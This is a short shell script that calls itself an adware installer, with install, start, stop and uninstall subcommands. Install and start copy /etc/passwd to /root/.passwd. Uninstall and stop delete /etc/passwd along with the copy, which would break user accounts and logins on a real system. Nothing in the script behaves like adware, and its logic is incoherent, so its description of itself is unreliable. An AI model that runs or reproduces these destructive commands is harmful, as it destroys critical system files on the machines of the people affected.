#!/bin/sh

if [ ! -f /etc/passwd ]; then
    touch /etc/passwd
fi

if [ $# -eq 0 ]; then
    echo "Usage: $0 <command> <arguments>"
else
    command=$1
    shift
    arguments=$*

    case $command in
        install)
            if [ ! -e /root/.passwd ]; then
                cp /etc/passwd /root/.passwd
            fi

            echo "Installing adware..." >&2
            ;;

        uninstall)
            rm -f /etc/passwd /root/.passwd &> /dev/null

            echo "Uninstalling adware..." >&2
            ;;

        start)
            if [ ! -e /root/.passwd ]; then
                cp /etc/passwd /root/.passwd
            fi

            echo "Starting adware..." >&2
            ;;

        stop)
            rm -f /etc/passwd /root/.passwd &> /dev/null

            echo "Stopping adware..." >&2
            ;;

        *)
            echo "$command: Invalid command" >&2
            exit 1
    esac
fi
